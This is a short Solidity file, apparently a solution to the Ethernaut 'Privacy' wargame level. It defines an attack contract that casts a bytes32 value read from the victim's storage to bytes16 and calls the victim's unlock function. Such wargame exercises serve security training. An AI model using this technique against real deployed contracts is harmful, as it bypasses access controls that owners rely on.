//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../ethernautContracts/12_Privacy.sol";

import "hardhat/console.sol";

contract PrivacyAttack {
  
    Privacy public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = Privacy(_victimContractAddr);
    }

    function attack (bytes32 _unlockPwd) public {   
        bytes16 key;
        key = bytes16(_unlockPwd);
        victimContract.unlock(key);
    }

}